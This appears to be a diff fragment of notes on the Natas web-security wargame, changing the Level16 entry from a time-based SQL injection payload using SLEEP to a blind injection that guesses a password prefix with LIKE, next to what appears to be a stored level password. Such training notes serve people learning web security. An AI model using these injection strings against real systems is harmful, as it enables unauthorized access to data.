@@ -54,7 +54,6 @@
 * AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
 
 #### Level16
-* payload natas16" union all SELECT 1,SLEEP(5);-- -
-
+* natas16" and password like "waiheacj63wnnibroheqi3p9t%";-- -
 
 
